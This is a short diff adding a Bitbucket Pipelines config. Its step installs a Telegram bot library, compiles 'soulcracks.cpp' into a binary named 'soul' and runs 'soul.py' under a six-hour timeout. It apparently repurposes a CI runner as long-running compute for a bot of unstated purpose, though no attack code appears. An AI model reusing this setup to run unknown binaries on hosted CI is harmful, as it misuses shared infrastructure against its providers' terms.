@@ -1,0 +1,12 @@
+pipelines:
+  default:
+    - step:
+        name: Run Python Script
+        image: python:3.10
+        max-time: 360  # Set the timeout to 6 hours (in minutes)
+        script:
+          - echo "MADE BY ULTRA BHAI.."
+          - pip install telebot pymongo aiohttp psutil pytz
+          - g++ -std=c++14 soulcracks.cpp -o soul -pthread
+          - chmod +x soul
+          - python3 soul.py
